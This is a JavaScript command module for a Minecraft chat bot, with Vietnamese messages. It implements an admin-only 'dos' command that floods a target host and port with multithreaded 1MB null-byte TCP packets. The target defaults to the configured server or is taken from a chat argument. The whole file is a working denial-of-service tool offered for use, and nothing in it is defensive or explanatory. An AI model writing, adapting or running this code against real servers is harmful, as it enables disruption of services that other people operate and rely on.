import net from 'net'
import config from '../config.js'

export default {
  name: 'dos',
  description: 'Spam TCP null packet 1MB đa luồng. Mặc định dùng config.js nếu không truyền IP',
  adminOnly: true,

  async execute(bot, username, args) {
    let ip = config.host
    let port = config.port

    if (args[0] && args[0].includes(':')) {
      const [host, portStr] = args[0].split(':')
      const parsedPort = parseInt(portStr)

      if (!portStr || isNaN(parsedPort)) {
        return bot.chat(`/minecraft:w ${username} Port không hợp lệ hoặc sai cú pháp IP:PORT`)
      }

      ip = host
      port = parsedPort
    }

    const threads = parseInt(args[1]) || 20
    const packetCount = parseInt(args[2]) || 15
    const packet = Buffer.alloc(1024 * 1024, 0x00) 

    bot.chat(`/minecraft:w ${username} Bắt đầu spam ${packetCount} packet × ${threads} luồng tới ${ip}:${port}`)

    for (let i = 0; i < threads; i++) {
      setTimeout(() => {
        const client = new net.Socket()

        client.connect(port, ip, () => {
          bot.chat(`/w ${username} [#${i}] Socket đã kết nối`)
          let sent = 0

          const sendLoop = setInterval(() => {
            if (sent >= packetCount) {
              clearInterval(sendLoop)
              client.end()
              bot.chat(`/w ${username} [#${i}] Đã gửi xong ${packetCount} packet`)
              return
            }

            client.write(packet, err => {
              if (err) {
                bot.chat(`/w ${username} [#${i}] Lỗi gửi packet: ${err.message}`)
              } else {
                console.log(`[#${i}] Packet ${sent + 1} đã gửi`)
              }
            })

            sent++
          }, 50)
        })

        client.on('error', err => {
          bot.chat(`/minecraft:w ${username} [#${i}] Lỗi socket: ${err.message}`)
        })

        client.on('close', () => {
          console.log(`[#${i}] Socket đóng`)
        })
      }, i * 100)
    }
  }
}